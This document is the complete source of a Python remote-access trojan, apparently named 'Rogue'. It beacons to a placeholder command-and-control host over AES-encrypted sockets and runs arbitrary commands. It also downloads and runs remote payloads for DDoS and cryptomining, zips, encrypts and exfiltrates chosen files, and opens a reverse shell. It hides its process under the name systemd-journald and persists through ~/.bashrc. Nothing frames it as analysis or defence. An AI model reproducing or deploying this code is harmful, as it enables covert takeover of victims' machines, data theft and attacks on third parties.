#!/usr/bin/env python3
import socket, subprocess, base64, time, urllib.request, os, threading
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes
import zipfile, tempfile, shutil, sys

SECRET_KEY = b'Sixteen byte key'
EXFIL_KEY = b'TrinityRogueKey!'  # 16 bytes AES key
C2_HOST = 'YOUR.C2.IP.HERE'
C2_PORT = 4444
EXFIL_PORT = 9090
PAYLOAD_REPO = "http://YOUR.C2.IP.HERE:8000/"
HIDDEN_DIR = os.path.expanduser("~/.cache/.rogue")
os.makedirs(HIDDEN_DIR, exist_ok=True)

def encrypt_response(msg):
    cipher = AES.new(SECRET_KEY, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(msg.encode())
    return base64.b64encode(cipher.nonce + tag + ciphertext)

def decrypt_command(data):
    data = base64.b64decode(data)
    nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
    cipher = AES.new(SECRET_KEY, AES.MODE_EAX, nonce)
    return cipher.decrypt_and_verify(ciphertext, tag).decode()

def fetch_payload(name):
    url = f"{PAYLOAD_REPO}{name}"
    dest = os.path.join(HIDDEN_DIR, name)
    try:
        urllib.request.urlretrieve(url, dest)
        return dest
    except:
        return None

def run_payload(name):
    path = os.path.join(HIDDEN_DIR, name)
    if os.path.exists(path):
        return subprocess.getoutput(f"python3 {path}")
    else:
        return f"[!] Payload {name} not found."

def zip_directory(path):
    zip_path = tempfile.NamedTemporaryFile(delete=False, suffix=".zip").name
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        if os.path.isdir(path):
            for root, _, files in os.walk(path):
                for file in files:
                    full_path = os.path.join(root, file)
                    arcname = os.path.relpath(full_path, start=path)
                    zipf.write(full_path, arcname)
        else:
            zipf.write(path, arcname=os.path.basename(path))
    return zip_path

def encrypt_file(path):
    with open(path, 'rb') as f:
        plaintext = f.read()
    cipher = AES.new(EXFIL_KEY, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    return cipher.nonce + tag + ciphertext

def exfiltrate_data(path):
    try:
        zip_path = zip_directory(path)
        encrypted_blob = encrypt_file(zip_path)
        os.remove(zip_path)

        s = socket.socket()
        s.connect((C2_HOST, EXFIL_PORT))
        s.sendall(encrypted_blob)
        s.close()
        return f"[+] Exfiltrated encrypted archive from: {path}"
    except Exception as e:
        return f"[!] Exfiltration failed: {e}"

def handle_trigger(cmd):
    if cmd.startswith("trigger_ddos"):
        parts = cmd.split()
        fetch_payload("ddos.py")
        path = os.path.join(HIDDEN_DIR, "ddos.py")
        args = " ".join(parts[1:])
        full_cmd = f"python3 {path} {args}"
        return subprocess.getoutput(full_cmd)

    elif cmd == "trigger_mine":
        return run_payload("mine.py")

    elif cmd.startswith("trigger_exfil"):
        parts = cmd.split(" ", 1)
        if len(parts) != 2:
            return "[!] Usage: trigger_exfil /path/to/target"
        return exfiltrate_data(parts[1])

    return None

def reverse_shell():
    try:
        s = socket.socket()
        s.connect((C2_HOST, 9001))
        while True:
            s.send(b"$ ")
            cmd = s.recv(1024).decode()
            if cmd.strip().lower() == "exit":
                break
            output = subprocess.getoutput(cmd)
            s.send(output.encode())
        s.close()
    except:
        pass

def handle_command(cmd):
    if cmd.startswith("load_payload"):
        _, name = cmd.split()
        if fetch_payload(name):
            return f"[+] Fetched {name}"
        else:
            return f"[!] Failed to fetch {name}"

    elif cmd.startswith("run_payload"):
        _, name = cmd.split()
        return run_payload(name)

    elif cmd.startswith("trigger_ddos") or cmd == "trigger_mine" or cmd.startswith("trigger_exfil"):
        return handle_trigger(cmd) or "[!] Trigger failed"

    elif cmd == "reverse_shell":
        threading.Thread(target=reverse_shell).start()
        return "[*] Reverse shell started"

    return subprocess.getoutput(cmd)

def connect():
    while True:
        try:
            s = socket.socket()
            s.connect((C2_HOST, C2_PORT))
            while True:
                encrypted_data = s.recv(4096)
                cmd = decrypt_command(encrypted_data)
                result = handle_command(cmd)
                s.send(encrypt_response(result))
        except:
            time.sleep(5)

def fake_name():
    try:
        import setproctitle
        setproctitle.setproctitle("systemd-journald")
    except:
        pass

def setup_persistence():
    target = os.path.join(HIDDEN_DIR, ".rogue_agent.py")
    if not os.path.exists(target):
        subprocess.run(["cp", __file__, target])
        with open(os.path.expanduser("~/.bashrc"), "a") as f:
            f.write(f"\n(sleep 10 && python3 {target} &) &\n")
        os.chmod(target, 0o700)

def p2p_fallback_listener():
    peer_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    peer_sock.bind(('0.0.0.0', 7007))
    while True:
        data, addr = peer_sock.recvfrom(1024)
        if data.decode() == "Rogue?":
            peer_sock.sendto(b"I'm Rogue", addr)

def p2p_broadcast_ping():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.sendto(b"Rogue?", ('<broadcast>', 7007))

threading.Thread(target=p2p_fallback_listener, daemon=True).start()
threading.Thread(target=p2p_broadcast_ping, daemon=True).start()

fake_name()
setup_persistence()
connect()
